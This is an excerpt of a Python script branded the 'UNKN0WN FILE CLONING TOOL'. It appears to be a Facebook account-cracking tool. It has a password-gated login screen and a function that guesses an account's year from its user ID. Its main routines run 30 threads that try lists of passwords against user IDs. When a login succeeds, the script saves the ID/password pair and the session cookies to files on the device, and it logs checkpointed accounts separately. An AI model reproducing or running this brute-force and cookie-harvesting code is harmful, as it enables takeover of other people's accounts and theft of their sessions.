...
#----------------------[TOOL LOGIN]----------------#
os.system("clear")
os.system('xdg-open https://www.facebook.com/eiff.huczn')
print(logo)
print("\r      \x1b[1;97m\x1b[1;41m WELCOME TO UNKN0WN FILE CLONING TOOL \x1b[0m")
line()
print(f"\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mYOUR IP ADDRESS : \033[1;36m"+ip)
Password = "EIFFPOGI" # --> Data Req Api key --> open_xyz(life)("XYZHACKERZ")

Xxx = 'true'
while (Xxx == 'true'):
    passcode = input(f"\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mENTER TOOL PASSWORD : ")
    if (passcode == Password):
            Xxx = 'false'
            print("   \033[1;32m YOUR PASSWORD IS CORRECT ✓")
            time.sleep(2)
    else:
            print(f"   \033[1;91m  YOUR PASSWORD IS INCORRECT ✘")
            opt = input('\n   \033[1;92mPress enter contact developer to get Toll Password ')
            os.system('xdg-open https://www.facebook.com/eiff.huczn')
            print(f" \033[1;37m<\> If You Get The Password, Run Again-")
            exit()
...
def asha(uid):
    if len(uid)==15:
        ...
        elif uid[:9] in ['100000000']       :alif = ' \033[1;33m2009'
        elif uid[:8] in ['10000000']        :alif = ' \033[1;33m2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' \033[1;33m2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' \033[1;33m2010'
        elif uid[:6] in ['100001']          :alif = ' \033[1;33m2010/2011'
        elif uid[:6] in ['100002','100003'] :alif = ' \033[1;33m2011/2012'
        elif uid[:6] in ['100004']          :alif = ' 2012/2013'
        elif uid[:6] in ['100005','100006'] :alif = ' \033[1;33m2013/2014'
        elif uid[:6] in ['100007','100008'] :alif = ' \033[1;33m2014/2015'
        elif uid[:6] in ['100009']          :alif = ' \033[1;33m2015'
        elif uid[:5] in ['10001']           :alif = ' \033[1;33m2015/2016'
        elif uid[:5] in ['10002']           :alif = ' \033[1;33m2016/2017'
        elif uid[:5] in ['10003']           :alif = ' \033[1;33m2018/2019'
        elif uid[:5] in ['10004']           :alif = ' \033[1;33m2019/2020'
        elif uid[:5] in ['10005']           :alif = ' \033[1;33m2020'
        elif uid[:5] in ['10006','10007','']:alif = ' \033[1;33m2021'
        elif uid[:5] in ['10008']           :alif = ' \033[1;33m2022'
        elif uid[:5] in ['10009']           :alif = ' \033[1;33m2023'
        else:alif=''
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(f'  \x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mALIVE IDS SAVE IN  \033[38;5;8m:   \033[1;32mUNKN0WNm{mthd}-OK.txt') 
                                        print(f'  \x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mCOOKIES SAVE IN    \033[38;5;8m:   \033[1;32mUNKN0WNm{mthd}-COOKIES.txt') 
                                ...
                                clear()
                                print('  ⪼THANK YOU FOR USING UNKN0WN TOOL !!! ')
                                exit()
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write(f'\r\r\x1b[38;5;8m [\033[1;32mUNKNOWN M1\x1b[38;5;8m] \033[1;37m%s   \x1b[38;5;8mOK:- \033[1;32m%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				#print(f'\r\r\033[1;33m [UNKNOWN-CP] '+uid+' | '+pas+' \033[1;97m\n')
				open('/sdcard/UNKN0WNm1-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r\x1b[38;5;8m [\033[1;32mUNKNOWN M4\x1b[38;5;8m] \033[1;37m%s   \x1b[38;5;8mOK:- \033[1;32m%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m ╰─\033[38;5;8m[\033[1;32mCOOKIE:\033[38;5;8m] \033[1;39m'+cookies+'\033[1;32m\n')
				#cek_apk(session,coki)
				open('/sdcard/UNKN0WNm4-OK.txt','a').write(uid+' | '+pas+'\n')
				open('/sdcard/UNKNOWNm4-COOKIES.txt','a').write(uid+' | '+pas+' ==>> '+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [UNKNOWN-CP] '+uid+' | '+pas+' \033[1;97m\n')
				open('/sdcard/UNKN0WNm4-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
